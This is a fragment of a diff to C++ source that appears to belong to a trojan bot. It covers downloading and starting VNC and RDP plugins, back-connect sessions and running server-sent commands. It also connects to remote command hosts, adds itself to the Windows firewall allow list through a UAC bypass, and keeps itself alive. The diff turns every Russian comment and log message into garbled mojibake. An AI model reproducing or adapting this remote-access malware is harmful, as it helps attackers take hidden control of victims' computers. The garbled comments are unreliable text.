+	ULONGLONG	pModule32;	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 32пїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ DLL
+	ULONGLONG	pModule64;	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 64пїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ DLL
+	ULONG		Module32Size;	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 32пїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ DLL
+	ULONG		Module64Size;	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 64пїЅ-пїЅпїЅпїЅпїЅпїЅпїЅ DLL
 };
 
 DWORD WINAPI ProcessVNC2(void*)
 {
 	BOT::Initialize(ProcessUnknown);
 
-	VDRDBG("Video", "Запущен процесс VNCDLL. PID %d", Bot->PID());
+	VDRDBG("Video", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ VNCDLL. PID %d", Bot->PID());
 
 	DWORD c_data;
 	BYTE* data = Plugin::Download( "vncdll.plug", 0, &c_data, false );
@@ -703,8 +714,8 @@ DWORD WINAPI ProcessVNC2(void*)
 		if( module )
 		{
 			VDRDBG( "Video", "VNCDLL is run" );
-			pSleep(10000); //ждем 20 с пока запустится vnc
-			HANDLE mutex = CaptureMutex( "VNCDLL", 10000 ); //сообщаем что VNC запустился
+			pSleep(10000); //пїЅпїЅпїЅпїЅ 20 пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ vnc
+			HANDLE mutex = CaptureMutex( "VNCDLL", 10000 ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ VNC пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if( mutex )
 			{
 				while (true)
@@ -725,24 +736,24 @@ DWORD WINAPI ProcessVNC2(void*)
 	return 0;
 }
 
-//обработчик команд от видео длл
-//server - это не номер индекса в массиве servers, это ид сервере, возвращаемый длл, если нужен номер
-//сервера, то нужно пройтись по массиву servers и найти индекс
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+//server - пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ servers, пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ servers пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, char* outData, int szOutData, DWORD* lenOutData )
 {
 	DWORD res = 0;
 	switch( cmd )
 	{
-		case 21: //загрузка и запуск RDP
+		case 21: //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ RDP
 			VDRDBG( "Video", "RDP" );
-			if( WaitCaptureMutex( "RDP", 100 ) ) //может рдп уже запущен
+			if( WaitCaptureMutex( "RDP", 100 ) ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				outData[0] = 1;
 			else
 			{
 				MegaJump(ProcessRDP);
 				if( WaitCaptureMutex( "RDP", 2 * 60 * 1000 ) )
 				{
-					pSleep(10000); //ждем дополнительно пока стартанет RDP
+					pSleep(10000); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ RDP
 					outData[0] = 1;
 					VDRDBG( "Video", "RDP is start" );
 				}
@@ -754,9 +765,9 @@ DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, 
 			}
 			res = TRUE;
 			break;
-		case 22: //загрузка и запуск VNC
+		case 22: //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ VNC
 			VDRDBG( "Video", "VNC" );
-			if( WaitCaptureMutex( "VNC", 100 ) ) //может внц уже запущен
+			if( WaitCaptureMutex( "VNC", 100 ) ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				outData[0] = 1;
 			else
 			{
@@ -774,9 +785,9 @@ DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, 
 			}
 			res = TRUE;
 			break;
-		case 28: //загрузка и запуск VNCDLL
+		case 28: //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ VNCDLL
 			VDRDBG( "Video", "VNCDLL" );
-			if( WaitCaptureMutex( "VNCDLL", 100 ) ) //может внц уже запущен
+			if( WaitCaptureMutex( "VNCDLL", 100 ) ) //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				outData[0] = 1;
 			else
 			{
@@ -794,7 +805,7 @@ DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, 
 			}
 			res = TRUE;
 			break;
-		case 23: //запуск BC (back connect)
+		case 23: //пїЅпїЅпїЅпїЅпїЅпїЅ BC (back connect)
 			{
 				VDRDBG( "Video", "BC" );
 				int len = (inData[1] << 8) | inData[0];
@@ -805,11 +816,11 @@ DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, 
 					outData[0] = 1;
 				else
 					outData[0] = 0;
-//				if( inData && lenInData == sizeof(SOCKET) ) //в inData находится сокет
+//				if( inData && lenInData == sizeof(SOCKET) ) //пїЅ inData пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 //					RunThread( StartBCSessionWork, inData );
 			}
 			break;
-		case 27: //команда боту
+		case 27: //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			if( lenInData > 2 )
 			{
 				int len = (inData[1] << 8) | inData[0];
@@ -817,18 +828,18 @@ DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, 
 				char* p = cmd.AsStr();
 				m_memcpy( p, inData + 2, len );
 				p[len] = 0;
-				VDRDBG( "Video", "Получили строку команды: '%s', длина: %d", p, len );
+				VDRDBG( "Video", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: '%s', пїЅпїЅпїЅпїЅпїЅ: %d", p, len );
 				char* p2 = STR::Scan( p, ' ' );
 				char* args;
 				if( p2 )
 				{
-					*p2 = 0; //разделили команду и аргументы
+					*p2 = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					args = p2 + 1;
 					if( *args == ' ' ) args++;
 				}
 				else
-					args = p + len; //пустая строка
-				VDRDBG( "Video", "Получили команду: '%s', аргументы: '%s'", p, args );
+					args = p + len; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+				VDRDBG( "Video", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ: '%s', пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ: '%s'", p, args );
 				ExecuteCommand( 0, p, args );
 			}
 			break;
@@ -836,7 +847,7 @@ DWORD WINAPI CallbackCmd( DWORD server, DWORD cmd, char* inData, int lenInData, 
 	return res;
 }
 
-//анализирует строку ip:port, возвращает номер порта и айпи (если порт не указан, то порт по умолчанию)
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ ip:port, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 static int GetPortIp( const char* adr, char* ip )
 {
 	char* p = STR::Scan( adr, ':' );
@@ -859,17 +870,17 @@ bool Start()
 	dll = new TVideoRecDLL();
 	//dll->SetNotFree(true);
 	m_memset( servers, 0, sizeof(servers) );
-	//запускаем менеджер видео процесса в режиме спячки, т. е. соединяться с сервером будет только по команде
-	//или при передаче данных
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ. пїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	//пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	char ip[128];
 	int port = GetPortIp( VIDEO_REC_HOST1, ip );
 	VDRDBG( "Video", "Start manager ip %s:%d", ip, port );
 	servers[0] = dll->Init( Bot->UID().t_str(), TVideoRecDLL::Hibernation, ip, port, 0 );
 	if( servers[0] )
 	{
-		VDRDBG( "Video", "Менеджер инициализирован" );
+		VDRDBG( "Video", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		if( port != 80 )
-			dll->AddIPServer( servers[0], ip, 80 ); //добавляем такой же сервер но поключение идет через 80-й порт
+			dll->AddIPServer( servers[0], ip, 80 ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ 80-пїЅ пїЅпїЅпїЅпїЅ
 		port = GetPortIp( VIDEO_REC_HOST2, ip );
 		dll->AddIPServer( servers[0], ip, port );
 		VDRDBG( "Video", "Add server ip %s:%d", ip, port );
@@ -890,11 +901,11 @@ bool Start()
 			PIPE::RegisterMessageHandler( pipe, HandlerSendLog, 0, GetStr(VideoRecFuncSendLog).t_str(), 0 );
 			PIPE::RegisterMessageHandler( pipe, HandlerOutOfHibernation, 0, GetStr(VideoRecOutOfHibernation).t_str(), 0 );
 
-			dll->RunCmdExec( servers[0], CallbackCmd ); //запуск потока выполнения команд от сервера
+			dll->RunCmdExec( servers[0], CallbackCmd ); //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 			if( PIPE::StartProcessPipe(pipe) )
 			{
-				VDRDBG( "Video", "Пайп канал открыт" );
+				VDRDBG( "Video", "пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" );
 				return true;
 			}
 			else
@@ -910,7 +921,7 @@ DWORD WINAPI StartSvchost(void*)
 	BOT::Initialize();
 	Start();
 	#ifdef KeepAliveH
-		// Инициализируем модуль живучести
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		KeepAliveInitializeProcess(PROCESS_VIDEO);
 	#endif
 	while(true) pSleep(INFINITE);
@@ -934,7 +945,7 @@ void ConnectToServer( int server, bool autorun )
 	}
 	if( connect )
 	{
-		VDRDBG( "Video", "Соединение с сервером" );
+		VDRDBG( "Video", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		UpdateSettings( 0, 0, 0, 24 * 60 );
 		OutOfHibernation(server);
 	}
@@ -953,7 +964,7 @@ void SetAutorun( bool set )
 
 char* PathToName( const char* path, char* name, int szName )
 {
-	const char* bad = "\\/:'\" "; //символы которые заменяем на _
+	const char* bad = "\\/:'\" "; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ _
 	const char* p = path;
 	char* n = name;
 	int i = 0;
@@ -969,11 +980,11 @@ char* PathToName( const char* path, char* name, int szName )
 	return name;
 }
 
-//добавляет указанный файл в список разрешенных браундмаузера винды
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 bool AddAllowedprogram( const char* pathExe )
 {
 	char name[64];
-	//формируем имя правила на осноне имени exe
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ exe
 	char* pn1 = (char*)pPathFindFileNameA(pathExe);
 	char* pn2 = (char*)pPathFindExtensionA(pathExe);
 	int pnlen = pn2 ? pn2 - pn1 : m_lstrlen(pn1);
@@ -981,15 +992,15 @@ bool AddAllowedprogram( const char* pathExe )
 	m_memcpy( name, pn1, pnlen );
 	name[pnlen] = 0;
 
-	//делаем текущей директорией папку windows\system32\wbem, для того чтобы
-	//команда выполнилась без проблем на всех машинах (без этого не везде может сработать)
+	//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ windows\system32\wbem, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 	char currDir[MAX_PATH], systemDir[MAX_PATH];
 	pGetCurrentDirectoryA( sizeof(currDir), currDir );
 	pGetSystemDirectoryA( systemDir, sizeof(systemDir) );
 	pPathAppendA( systemDir, "wbem" );
 	pSetCurrentDirectoryA(systemDir);
 
-	//по версии windows выбираем формат команды
+	//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ windows пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	char* cmdAdd = (char*)HEAP::Alloc(512);
 	char* cmdDel = (char*)HEAP::Alloc(512);
 
@@ -1028,10 +1039,10 @@ bool AddAllowedprogramUAC( const char* pathExe )
 	pGetVersionExA(&ver);
 	if( ver.dwMajorVersion < 6 ) 
 		return AddAllowedprogram(pathExe);
-	else //для 7-ки делаем через обход уака
+	else //пїЅпїЅпїЅ 7-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	{
 		bool res = RunBotBypassUAC( 0, UAC_CMD_AddAllowed, pathExe );
-		if( res ) pSleep(10000); //ждем пока выполнится команда
+		if( res ) pSleep(10000); //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		return res;
 	}
 }
